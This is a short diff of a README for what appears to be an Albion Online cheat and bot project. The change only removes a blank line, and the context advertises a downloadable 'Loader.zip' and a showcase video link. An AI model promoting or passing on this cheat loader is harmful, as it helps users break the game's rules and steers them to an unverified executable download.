@@ -75,7 +75,6 @@ Albion Online Bot &amp; cheat, Gathering, Fishing, Full Optimized Combat Bot.
 The latest version can be downloaded [here](https://github.com/Forbidi/Albion-Online-Bot/releases/latest/download/Loader.zip).
 
 ## Media
-
 click image to display video
 
 [<img src="https://user-images.githubusercontent.com/29312029/275824980-ef7e588a-4e53-45be-add6-7a3cb8a1c479.png" width="100%">](https://drive.google.com/file/d/1d9bdABoeF1uC9g4JaNCMffenhxXM07pO/view "Showcase")
